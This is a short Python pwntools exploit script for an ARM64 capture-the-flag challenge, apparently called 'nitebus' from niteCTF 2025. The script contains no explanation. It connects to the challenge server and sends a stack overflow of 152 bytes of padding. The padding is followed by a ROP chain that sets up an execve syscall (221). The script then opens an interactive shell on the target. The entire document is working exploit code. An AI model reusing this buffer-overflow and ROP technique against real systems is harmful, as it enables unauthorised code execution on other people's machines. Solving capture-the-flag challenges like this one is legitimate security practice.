#!/usr/bin/env python3
from pwn import *

# debug using: https://github.com/z0v3r1n/arm64_debugging
io = remote("nitebus.chals.nitectf25.live", 1337, ssl=True)

rop  = b''
rop += p64(0x43c83c) + cyclic(40)
rop += p64(0x4361fc) + cyclic(16)
rop += p64(0x40157c) + cyclic(32, n=8)
rop += p64(0x43ff58) + cyclic(16, n=8)
rop += p64(221) + p64(0)*7 + p64(0x490040) + p64(0) + cyclic(152, n=8)
rop += p64(0x401578)

io.sendline(p8(1) + p8(0x42) + p16(1000))
io.sendlineafter(b'data: ', b'A'*152 + rop)

io.interactive()
